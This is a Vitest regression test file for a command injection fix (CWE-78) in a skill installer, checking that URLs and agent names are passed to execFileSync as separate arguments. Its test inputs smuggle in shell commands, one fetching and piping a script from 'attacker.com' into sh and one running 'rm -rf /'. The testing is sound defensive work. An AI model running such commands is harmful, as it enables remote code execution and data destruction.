/**
 * CWE-78: Command injection via unsanitized skillUrl in installSkill
 *
 * The installSkill function interpolates user-supplied URLs into a shell
 * command string and passes it to execSync, which invokes a shell.
 * Shell metacharacters in the URL (;, |, $(), backticks) are interpreted,
 * enabling arbitrary command execution.
 *
 * The fix replaces execSync(string) with execFileSync("npx", [...args]),
 * which bypasses shell interpretation entirely.
 */

import { beforeEach, describe, expect, test, vi } from "vitest"

function createSmitheryMock() {
	return {
		Smithery: vi.fn().mockImplementation(() => ({
			skills: {
				get: vi.fn().mockResolvedValue({
					id: "test-id",
					namespace: "test-ns",
					slug: "test-skill",
				}),
			},
		})),
	}
}

vi.mock("@smithery/api", () => createSmitheryMock())
vi.mock("@smithery/api/client.js", () => createSmitheryMock())

vi.mock("node:child_process", () => ({
	execSync: vi.fn(),
	execFileSync: vi.fn(),
}))

vi.spyOn(console, "log").mockImplementation(() => {})
vi.spyOn(console, "error").mockImplementation(() => {})

describe("CWE-78: command injection via skillUrl", () => {
	beforeEach(() => {
		vi.clearAllMocks()
	})

	test("URL with shell metacharacters must not be interpolated into a shell command string", async () => {
		const childProcess = await import("node:child_process")
		const { installSkill } = await import("../skill/install")

		// Malicious URL containing shell injection payload
		const maliciousUrl = "http://evil.com/x; curl attacker.com/shell.sh | sh"

		await installSkill(maliciousUrl)

		// After fix: execFileSync should be called instead of execSync
		// The URL must be passed as a single array element, not interpolated into a string
		const execFileSync = childProcess.execFileSync as ReturnType<typeof vi.fn>
		const execSync = childProcess.execSync as ReturnType<typeof vi.fn>

		// execSync with a string command must NOT be called
		expect(execSync).not.toHaveBeenCalled()

		// execFileSync must be called with args as an array
		expect(execFileSync).toHaveBeenCalledTimes(1)
		const [cmd, args] = execFileSync.mock.calls[0]
		expect(cmd).toBe("npx")
		expect(args).toContain(maliciousUrl)
		// The malicious URL must be a single, intact argument — not split by the shell
		expect(
			args.every((a: string) => !a.includes(";") || a === maliciousUrl),
		).toBe(true)
	})

	test("agent parameter with shell metacharacters must not be interpolated", async () => {
		const childProcess = await import("node:child_process")
		const { installSkill } = await import("../skill/install")

		const maliciousAgent = "claude; rm -rf /"

		await installSkill("test-ns/test-skill", maliciousAgent)

		const execFileSync = childProcess.execFileSync as ReturnType<typeof vi.fn>
		expect(execFileSync).toHaveBeenCalledTimes(1)
		const [, args] = execFileSync.mock.calls[0]
		// The agent string must be passed as a single array element
		expect(args).toContain(maliciousAgent)
	})

	test("normal URL is passed correctly as array argument", async () => {
		const childProcess = await import("node:child_process")
		const { installSkill } = await import("../skill/install")

		await installSkill("http://smithery.ai/skills/test/example")

		const execFileSync = childProcess.execFileSync as ReturnType<typeof vi.fn>
		expect(execFileSync).toHaveBeenCalledTimes(1)
		const [cmd, args] = execFileSync.mock.calls[0]
		expect(cmd).toBe("npx")
		expect(args).toEqual([
			"-y",
			"skills",
			"add",
			"http://smithery.ai/skills/test/example",
		])
	})

	test("all flags are passed as separate array elements", async () => {
		const childProcess = await import("node:child_process")
		const { installSkill } = await import("../skill/install")

		await installSkill("http://smithery.ai/skills/test/example", "cursor", {
			global: true,
			yes: true,
			copy: true,
		})

		const execFileSync = childProcess.execFileSync as ReturnType<typeof vi.fn>
		expect(execFileSync).toHaveBeenCalledTimes(1)
		const [cmd, args] = execFileSync.mock.calls[0]
		expect(cmd).toBe("npx")
		expect(args).toEqual([
			"-y",
			"skills",
			"add",
			"http://smithery.ai/skills/test/example",
			"--agent",
			"cursor",
			"-g",
			"-y",
			"--copy",
		])
	})
})
